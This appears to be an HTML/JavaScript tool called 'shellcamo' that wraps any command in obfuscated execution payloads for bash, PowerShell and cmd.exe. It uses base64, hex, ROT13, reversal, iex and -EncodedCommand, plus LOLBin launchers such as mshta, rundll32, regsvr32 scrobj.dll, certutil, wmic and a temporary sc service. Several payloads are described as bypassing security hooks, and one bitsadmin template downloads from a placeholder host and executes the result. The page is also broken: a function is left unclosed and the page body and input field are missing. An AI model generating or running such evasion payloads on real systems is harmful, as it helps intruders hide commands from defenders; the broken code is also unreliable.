<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>shellcamo // cmd obfuscator</title>
    <style>
        :root {
            --bg: #121212;
            --surface: #1e1e1e;
            --surface-alt: #181818;
            --border: #333;
            --text: #d4d4d4;
            --muted: #888;
            --accent: #89b4fa;
            --green: #a6e3a1;
            --red: #f38ba8;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            line-height: 1.5;
            font-size: 14px;
        }

        .container { max-width: 900px; margin: 0 auto; }

        .banner {
            text-align: center;
            font-size: 0.7rem;
            color: var(--muted);
            background: var(--surface-alt);
            padding: 5px;
            border: 1px solid var(--border);
            letter-spacing: 1.5px;
            text-transform: uppercase;
            margin-bottom: 20px;
        }

        header {
            border-bottom: 1px solid var(--border);
            padding-bottom: 15px;
            margin-bottom: 25px;
        }

        h1 {
            font-size: 1.2rem;
            font-weight: normal;
            color: var(--text);
            letter-spacing: -0.5px;
        }

        .credits {
            text-align: right;
            font-size: 0.8rem;
            color: var(--muted);
            margin-top: 8px;
        }

        .credits a {
            color: var(--accent);
            text-decoration: none;
        }

        .credits strong {
            color: var(--green);
        }

        label {
            display: block;
            font-size: 0.75rem;
            color: var(--muted);
            margin-bottom: 5px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        input, select {
            width: 100%;
            padding: 10px;
            background: var(--surface);
            border: 1px solid var(--border);
            color: var(--text);
            font-family: inherit;
            font-size: 0.95rem;
            margin-bottom: 15px;
            outline: none;
        }

        input:focus, select:focus { border-color: var(--accent); }

        button {
            padding: 10px 20px;
            background: var(--surface);
            border: 1px solid var(--border);
            color: var(--text);
            font-family: inherit;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: background 0.2s;
            font-size: 0.85rem;
        }

        button:hover {
            background: #2d2d2d;
            border-color: var(--accent);
        }

        .output-section { margin-top: 30px; }

        .platform-tabs {
            display: flex;
            border-bottom: 1px solid var(--border);
            margin-bottom: 20px;
        }

        .tab-btn {
            padding: 10px 15px;
            border: none;
            background: none;
            color: var(--muted);
            border-bottom: 2px solid transparent;
            cursor: pointer;
            font-family: inherit;
            font-size: 0.85rem;
        }

        .tab-btn.active {
            color: var(--green);
            border-bottom: 2px solid var(--green);
        }

        .tab-content { display: none; }
        .tab-content.active { display: block; }

        .payload-item {
            background: var(--surface);
            border: 1px solid var(--border);
            margin-bottom: 15px;
        }

        .payload-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 12px;
            background: var(--surface-alt);
            border-bottom: 1px solid var(--border);
            font-size: 0.85rem;
            color: var(--text);
        }

        .payload-header .tag {
            color: var(--muted);
            font-size: 0.75rem;
            margin-left: 8px;
            font-weight: normal;
        }

        .payload-code {
            padding: 12px;
            overflow-x: auto;
            white-space: pre;
            font-size: 0.9rem;
            color: var(--green);
            margin: 0;
            background: var(--surface);
        }

        .payload-desc {
            padding: 6px 12px;
            font-size: 0.75rem;
            color: var(--muted);
            border-top: 1px solid var(--border);
            background: var(--surface-alt);
        }

        .copy-btn {
            padding: 2px 8px;
            font-size: 0.75rem;
            border: 1px solid var(--border);
            background: transparent;
            color: var(--muted);
            cursor: pointer;
        }

        .copy-btn:hover {
            color: var(--green);
            border-color: var(--green);
        }

        .copy-btn.copied {
            color: var(--green);
            border-color: var(--green);
        }

        .disclaimer {
            margin-top: 40px;
            font-size: 0.75rem;
            color: var(--muted);
            text-align: center;
            border-top: 1px solid var(--border);
            padding-top: 15px;
        }

        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
    </style>
</head>

    <script>
        let selectedPlatform = 'linux';

        function selectPlatform(platform) {
            selectedPlatform = platform;
        }

        function switchTab(tabName) {
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.toggle('active', btn.dataset.tab === tabName);
            });
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.toggle('active', content.id === `tab-${tabName}`);
            });
        }

        document.addEventListener('click', function(e) {
            const copyBtn = e.target.closest('.copy-btn');
            if (!copyBtn) return;

            const card = copyBtn.closest('.payload-item');
            const code = card.dataset.payloadCode;
            if (!code) return;

            const decoded = decodeURIComponent(escape(atob(code)));

            navigator.clipboard.writeText(decoded).then(() => {
                copyBtn.classList.add('copied');
                copyBtn.innerHTML = 'copied';
                setTimeout(() => {
                    copyBtn.classList.remove('copied');
                    copyBtn.innerHTML = 'copy';
                }, 2000);
            }).catch(() => {
                const ta = document.createElement('textarea');
                ta.value = decoded;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                copyBtn.classList.add('copied');
                copyBtn.innerHTML = 'copied';
                setTimeout(() => {
                    copyBtn.classList.remove('copied');
                    copyBtn.innerHTML = 'copy';
                }, 2000);
            });
        });

        function rot13(str) {
            return str.replace(/[a-zA-Z]/g, c => {
                const base = c <= 'Z' ? 65 : 97;
                return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
            });
        }

        function reverseStr(str) { return str.split('').reverse().join(''); }
        function toHex(str) { return str.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''); }
        function toOctal(str) { return str.split('').map(c => '\\' + c.charCodeAt(0).toString(8).padStart(3, '0')).join(''); }
        function hexEncode(str) { return [...str].map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(''); }

        function toPowerShellBase64(str) {
            const bytes = [];
            for (let i = 0; i < str.length; i++) {
                bytes.push(str.charCodeAt(i));
                bytes.push(0);
            }
            let binary = '';
            bytes.forEach(b => binary += String.fromCharCode(b));
            return btoa(binary);
        }

        function generateRandomVarName() {
            const chars = 'abcdefghijklmnopqrstuvwxyz';
            let result = '';
            for (let i = 0; i < 3 + Math.floor(Math.random() * 4); i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        }

        function rndInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

        function safeB64(str) { return btoa(unescape(encodeURIComponent(str))); }

        function escapeHtml(str) {
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }

        function generateBashPayloads(cmd) {
            const payloads = [];
            const safeCmd = cmd.replace(/"/g, '\\"');
            const safeCmdSingle = cmd.replace(/'/g, "'\\''");

            // Encodings
            payloads.push({ name: 'Base64 Encoding', tag: 'Encoding', description: 'Command fully encoded', code: `echo '${btoa(cmd)}' | base64 -d | bash` });
            payloads.push({ name: 'ROT13 Cipher', tag: 'Encoding', description: 'ROT13 shift cipher', code: `echo '${rot13(cmd)}' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash` });
            payloads.push({ name: 'String Reversal', tag: 'Transform', description: 'Reversed command', code: `echo '${reverseStr(cmd)}' | rev | bash` });
            payloads.push({ name: 'Hex Encoding ($\')', tag: 'Encoding', description: 'ANSI-C hex escapes', code: `eval $'${toHex(cmd)}'` });
            payloads.push({ name: 'Octal Encoding ($\')', tag: 'Encoding', description: 'ANSI-C octal escapes', code: `eval $'${toOctal(cmd)}'` });
            payloads.push({ name: 'Double Base64', tag: 'Layered', description: 'Two layers of base64', code: `echo '${btoa(btoa(cmd))}' | base64 -d | base64 -d | bash` });
            payloads.push({ name: 'Here-String + Base64', tag: 'Advanced', description: 'Bash here-string with base64', code: `bash <<< $(echo '${btoa(cmd)}' | base64 -d)` });
            payloads.push({ name: 'Process Substitution', tag: 'Advanced', description: 'Process substitution avoids temp files', code: `bash <(echo '${btoa(cmd)}' | base64 -d)` });
            payloads.push({ name: 'XARGS Execution', tag: 'Advanced', description: 'Base64 decoded via xargs piped to bash', code: `echo '${btoa(cmd)}' | base64 -d | xargs -I{} bash -c "{}"` });
            payloads.push({ name: 'Printf Hex Escapes', tag: 'Encoding', description: 'printf with hex escapes piped to bash', code: `printf '${toHex(cmd)}' | bash` });
            payloads.push({ name: 'xxd Reverse Hex', tag: 'Encoding', description: 'Hex string via xxd -r -p then executed', code: `echo '${hexEncode(cmd)}' | xxd -r -p | bash` });

            // LOLBins (Linux) - GTFOBins
            payloads.push({ name: 'nmap (Lua Script)', tag: 'LOLBin', description: 'Executes via nmap Lua engine using process substitution', code: `nmap --script <(echo 'os.execute("${safeCmd}")')` });

            payloads.push({ name: 'awk (System)', tag: 'LOLBin', description: 'Executes via awk BEGIN block', code: `awk 'BEGIN {system("${safeCmd}")}'` });
            payloads.push({ name: 'find (Exec)', tag: 'LOLBin', description: 'Executes via find -exec', code: `find . -maxdepth 0 -exec ${cmd} \; -quit` });
            payloads.push({ name: 'perl (Exec)', tag: 'LOLBin', description: 'Replaces process image via perl exec', code: `perl -e 'exec "${safeCmd}"'` });
            payloads.push({ name: 'php (System)', tag: 'LOLBin', description: 'Executes via PHP system()', code: `php -r 'system("${safeCmd}");'` });
            payloads.push({ name: 'python3 (OS System)', tag: 'LOLBin', description: 'Executes via Python os.system', code: `python3 -c 'import os; os.system("${safeCmd}")'` });
            payloads.push({ name: 'ruby (Exec)', tag: 'LOLBin', description: 'Replaces process image via ruby exec', code: `ruby -e 'exec "${safeCmd}"'` });
            payloads.push({ name: 'strace (Wrapper)', tag: 'LOLBin', description: 'Executes under strace to bypass userland hooks', code: `strace -o /dev/null ${cmd}` });
            payloads.push({ name: 'ltrace (Wrapper)', tag: 'LOLBin', description: 'Executes under ltrace to bypass userland hooks', code: `ltrace -o /dev/null ${cmd}` });
            payloads.push({ name: 'env (Prefix)', tag: 'LOLBin', description: 'Executes via env to bypass command-line parsing rules', code: `env ${cmd}` });

            // --- HYBRID TECHNIQUES (LOLBins + Encoding) ---
            payloads.push({ name: 'strace + Base64', tag: 'Hybrid', description: 'Bypasses userland hooks while decoding base64 in memory', code: `strace -o /dev/null bash -c "echo '${btoa(cmd)}' | base64 -d | bash"` });
            payloads.push({ name: 'strace + Hex', tag: 'Hybrid', description: 'Bypasses userland hooks while evaluating ANSI-C hex escapes', code: `strace -o /dev/null eval $'${toHex(cmd)}'` });
            payloads.push({ name: 'ltrace + Base64', tag: 'Hybrid', description: 'Bypasses library call hooks while decoding base64 payload', code: `ltrace -o /dev/null bash -c "echo '${btoa(cmd)}' | base64 -d | bash"` });

            payloads.push({ name: 'nmap + Base64 (Lua)', tag: 'Hybrid', description: 'nmap Lua engine executes a base64 decoded shell command', code: `nmap --script <(echo 'os.execute("echo \\"${btoa(cmd)}\\" | base64 -d | bash")')` });

            return payloads;
        }

        function generatePowerShellPayloads(cmd) {
            const payloads = [];
            const safeCmd = cmd.replace(/"/g, '\\"');

            payloads.push({ name: 'EncodedCommand (-enc)', tag: 'Native', description: 'UTF-16LE base64', code: `powershell.exe -EncodedCommand "${toPowerShellBase64(cmd)}"` });
            payloads.push({ name: 'Short Flag (-e)', tag: 'Native', description: 'Abbreviated flag, command base64 encoded', code: `powershell.exe -e "${toPowerShellBase64(cmd)}"` });
            payloads.push({ name: 'Character Array', tag: 'Encoding', description: 'Command as character codes', code: (() => { const codes = cmd.split('').map(c => c.charCodeAt(0)).join(','); const v = generateRandomVarName(); return `$${v} = [char[]](${codes}) -join ''; iex $${v}`; })() });
            payloads.push({ name: 'Reversed + Base64', tag: 'Layered', description: 'Reversed command base64 encoded', code: (() => { const reversed = reverseStr(cmd); const b64 = btoa(reversed); return `$r = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${b64}')); $chars = $r.ToCharArray(); [Array]::Reverse($chars); iex (-join $chars)`; })() });
            payloads.push({ name: 'Environment Variable', tag: 'Advanced', description: 'Base64 in env var, retrieved and decoded', code: (() => { const envVar = generateRandomVarName().toUpperCase(); return `$env:${envVar}='${btoa(cmd)}'; $decoded=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:${envVar})); iex $decoded`; })() });
            payloads.push({ name: 'ASCII Cast ([char]...)', tag: 'Encoding', description: 'Each char cast to [char] then joined', code: (() => { const bytes = [...cmd].map(c => `[char]${c.charCodeAt(0)}`).join(','); return `iex ([string]::Join('', (${bytes})))`; })() });
            payloads.push({ name: '[ScriptBlock]::Create', tag: 'Advanced', description: 'Base64 decoded into ScriptBlock dynamically', code: `[ScriptBlock]::Create([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${btoa(cmd)}'))).Invoke() | Out-Null` });
            payloads.push({ name: '.NET Convert Base64', tag: 'Advanced', description: 'Uses .NET Convert class for base64 decode', code: `$b64 = '${btoa(cmd)}'; $bytes = [System.Convert]::FromBase64String($b64); $cmd = [System.Text.Encoding]::UTF8.GetString($bytes); iex $cmd` });
            payloads.push({ name: 'Invoke-Command', tag: 'Advanced', description: 'Invoke-Command with base64 decoded scriptblock', code: `Invoke-Command -ScriptBlock ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${btoa(cmd)}'))))` });
            
            // LOLBins (Windows) - PowerShell
            payloads.push({ name: 'WMIC via WMI', tag: 'LOLBin', description: 'Executes via WMI class Win32_Process', code: `Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "${safeCmd}"` });
            payloads.push({ name: 'CimInstance (Modern WMI)', tag: 'LOLBin', description: 'Executes via CIM (modern WMI)', code: `Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="${safeCmd}"}` });
            payloads.push({ name: 'Bash (WSL)', tag: 'LOLBin', description: 'Executes via WSL bash if installed', code: `bash.exe -c "${safeCmd}"` });

            // --- HYBRID TECHNIQUES (LOLBins + Encoding) ---
            payloads.push({ name: 'WMIC + EncodedCommand', tag: 'Hybrid', description: 'Spawns process via WMI, executing Encoded PowerShell payload', code: `wmic process call create "powershell.exe -e ${toPowerShellBase64(cmd)}"` });
            payloads.push({ name: 'CimInstance + Encoded', tag: 'Hybrid', description: 'Modern WMI execution of an Encoded PowerShell payload', code: `Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell.exe -enc ${toPowerShellBase64(cmd)}"}` });

            return payloads;
        }

        function generateCmdPayloads(cmd) {
            const payloads = [];
            const safeCmd = cmd.replace(/"/g, '\\"');

            payloads.push({ name: 'certutil -decode', tag: 'LOLBin', description: 'Base64 written to file, decoded with certutil', code: (() => { const b64 = btoa(cmd); const fname = `p${rndInt(100,999)}.b64`; const out = `p${rndInt(100,999)}.txt`; return `echo ${b64} > ${fname} && certutil -decode ${fname} ${out} >nul && set /p result=<${out} && cmd /c %result%`; })() });
            payloads.push({ name: 'mshta VBScript', tag: 'LOLBin', description: 'mshta executes VBScript with encoded command', code: (() => { return `mshta "vbscript:Execute(""Set x=CreateObject(""""Wscript.Shell""""):x.Run """"cmd /c """" & StrReverse(""""${reverseStr(cmd)}""""),0,True:close"")"`; })() });
            payloads.push({ name: 'rundll32 JavaScript', tag: 'LOLBin', description: 'rundll32 with javascript: protocol executes encoded cmd', code: (() => { const b64 = btoa(cmd); return `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";var s=new ActiveXObject("WScript.Shell");s.Run("cmd /c " + atob("${b64}"),0,true);close();`; })() });
            payloads.push({ name: 'regsvr32 scrobj.dll', tag: 'LOLBin', description: 'regsvr32 loads scriptlet with encoded command', code: (() => { const b64 = btoa(cmd); return `regsvr32 /s /n /u /i:data:application/vnd.ms-windows-scriptlet;base64,${b64} scrobj.dll`; })() });
            payloads.push({ name: 'bitsadmin download', tag: 'LOLBin', description: 'bitsadmin downloads and executes encoded payload', code: (() => { const b64 = btoa(cmd); return `bitsadmin /transfer n http://x/${b64} %TEMP%\\p.txt && certutil -decode %TEMP%\\p.txt %TEMP%\\c.txt >nul && set /p r=<%TEMP%\\c.txt && cmd /c %r%`; })() });
            
            // LOLBins (Windows) - CMD
            payloads.push({ name: 'wmic (Process Create)', tag: 'LOLBin', description: 'Spawns process via WMI command line', code: `wmic process call create "${safeCmd}"` });
            payloads.push({ name: 'sc (Service Create)', tag: 'LOLBin', description: 'Creates and starts a temporary service (requires admin)', code: (() => { const sName = `sys${rndInt(10,99)}`; return `sc create ${sName} binPath= "${safeCmd}" && sc start ${sName} && sc delete ${sName}`; })() });
            payloads.push({ name: 'pcalua (Compat Assistant)', tag: 'LOLBin', description: 'Executes via Program Compatibility Assistant', code: `pcalua.exe -a "${safeCmd}"` });

            // --- HYBRID TECHNIQUES (LOLBins + Encoding) ---
            payloads.push({ name: 'pcalua + Base64 (certutil)', tag: 'Hybrid', description: 'Program Compatibility Assistant decodes and runs base64 via certutil', code: (() => { 
                const b64 = btoa(cmd); 
                const id = rndInt(100,999);
                return `pcalua.exe -a "cmd /c echo ${b64} > %TEMP%\\b${id}.txt && certutil -decode %TEMP%\\b${id}.txt %TEMP%\\c${id}.txt >nul && cmd /c %TEMP%\\c${id}.txt"`;

        function generatePayloads() {
            const cmd = document.getElementById('commandInput').value.trim();
            if (!cmd) return alert('enter a command');

            const outputSection = document.getElementById('outputSection');
            const tabBash = document.getElementById('tab-bash');
            const tabPS = document.getElementById('tab-powershell');
            const tabCmd = document.getElementById('tab-cmd');

            let bashPayloads = [];
            let psPayloads = [];
            let cmdPayloads = [];

            if (selectedPlatform === 'linux' || selectedPlatform === 'all') {
                bashPayloads = generateBashPayloads(cmd);
            }
            if (selectedPlatform === 'windows' || selectedPlatform === 'all') {
                psPayloads = generatePowerShellPayloads(cmd);
                cmdPayloads = generateCmdPayloads(cmd);
            }

            tabBash.innerHTML = renderPayloads(bashPayloads);
            tabPS.innerHTML = renderPayloads(psPayloads);
            tabCmd.innerHTML = renderPayloads(cmdPayloads);

            const tabsContainer = document.getElementById('tabsContainer');
            tabsContainer.innerHTML = '';
            if (bashPayloads.length > 0) {
                tabsContainer.innerHTML += `<button class="tab-btn ${selectedPlatform === 'linux' ? 'active' : ''}" data-tab="bash" onclick="switchTab('bash')">bash (${bashPayloads.length})</button>`;
            }
            if (psPayloads.length > 0) {
                tabsContainer.innerHTML += `<button class="tab-btn ${selectedPlatform === 'windows' ? 'active' : ''}" data-tab="powershell" onclick="switchTab('powershell')">powershell (${psPayloads.length})</button>`;
            }
            if (cmdPayloads.length > 0) {
                tabsContainer.innerHTML += `<button class="tab-btn ${selectedPlatform === 'windows' ? 'active' : ''}" data-tab="cmd" onclick="switchTab('cmd')">cmd.exe (${cmdPayloads.length})</button>`;
            }

            const firstTab = selectedPlatform === 'linux' ? 'bash' : (psPayloads.length > 0 ? 'powershell' : 'cmd');
            switchTab(firstTab);

            outputSection.style.display = 'block';
            outputSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }

        function renderPayloads(payloads) {
            if (payloads.length === 0) {
                return `<div style="text-align:center; padding:3rem; color:var(--muted);">no payloads generated for this platform</div>`;
            }

            let html = '';
            payloads.forEach((payload, index) => {
                const encodedCode = safeB64(payload.code);
                html += `
                    <div class="payload-item" data-payload-code="${encodedCode}">
                        <div class="payload-header">
                            <span>${payload.name} <span class="tag">[${payload.tag}]</span></span>
                            <button class="copy-btn">copy</button>
                        </div>
                        <pre class="payload-code">${escapeHtml(payload.code)}</pre>
                        <div class="payload-desc">// ${payload.description}</div>
                    </div>
                `;
            });
            return html;
        }

        document.getElementById('commandInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') generatePayloads();
        });
    </script>
</body>
</html>
